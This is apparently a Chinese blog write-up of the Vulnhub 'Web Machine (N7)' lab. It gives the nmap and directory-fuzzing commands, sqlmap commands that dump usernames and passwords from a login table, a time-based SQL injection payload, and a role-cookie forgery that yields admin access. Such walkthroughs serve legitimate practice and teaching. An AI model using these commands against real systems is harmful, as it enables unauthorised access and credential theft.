---
layout: post
title: Web Machine (N7)
subtitle: Web Machine (N7)
date: 2022-12-09 20:35
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - Vulnhub
  - 靶场实战
published: true
---

## Web Machine (N7)

靶机 ip：192.168.56.101

kali 攻击机 ip：192.168.56.102

注：关于 vmware 和 virtual box 虚拟机如何建立网络连接，详见：[不同虚拟化平台的虚拟机之间进行网络通信 - 简书](https://www.jianshu.com/p/632d91db9430)

### 1. 使用 nmap 扫描 c 段

```shell
nmap -sS 192.168.56.0/24
# 发现192.168.56.101
nmap -sV -sC -A 192.168.56.101
# 发现只有80端口开放
```

### 2. 扫描目录

```shell
dirb http://192.168.56.101
# http://192.168.56.101/index.html
# http://192.168.56.101/server-status
```

在浏览器查看，未发现有效信息，继续扫描

```shell
wfuzz -w /usr/share/fuzzDicts/ctfDict/ctf.txt --hc 404 http://192.168.56.101/FUZZ

ffuf -u "http://192.168.56.101/FUZZ" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 404 -e .html,.txt,.php,.zip
```

发现 exploit.html 文件，访问并提交文件，发现跳转到 localhost。将 localhost 改为靶机 ip 尝试。

![image-20221209203518987.png](https://img.ghostliner.top/Zk10Bb.png)

点击提交，得到部分 flag `FLAG{N7`

通过扫描得到`enter_network/index.php` 和 `enter_network/admin.php` 。第一个为登陆界面，第二个需要 admin 权限。接下来可以对登陆界面使用 sqlmap 检测是否有注入漏洞，或是 bp 抓包分析。

### 3. 使用 sqlmap 进行 sql 注入

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --dbs --current-db
# 数据库名 Machine
```

![image-20221209174849702.png](https://img.ghostliner.top/hMbCrZ.png)

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" --tables
```

得到 tables: login

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" -T "login" --columns
```

得到 colums: password;role;username

```shell
sqlmap -u "http://192.168.56.101/enter_network/" --forms --batch -D "Machine" -T "login" -C "username,role,password" --dump
# username:administrator
# role:admin
# password:FLAG{N7:KSA_01}
```

![image-20221209174731002.png](https://img.ghostliner.top/5AH2sR.png)

### 4. bp 抓包分析

![image-20221209205529082.png](https://img.ghostliner.top/nKhqbY.png)

response 中 set-Cookie 中`%253D`为=

```
MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
# 尝试进行base64解密
21232f297a57a5a743894a0e4a801fc3
# 32位尝试MD5解密
admin
```

思路 1：用户名处输入`1'+or+sleep(3)--+`发现有注入漏洞，可根据时间盲注，结合 bp 或 sqlmap。

思路 2：根据此漏洞猜解用户名，不如思路 1。

思路 3：针对 admin.php，修改 request 中 cookie 中 role 为 admin

![image-20221209212032503.png](https://img.ghostliner.top/gAMIcc.png)

得到： `KSA_01}`
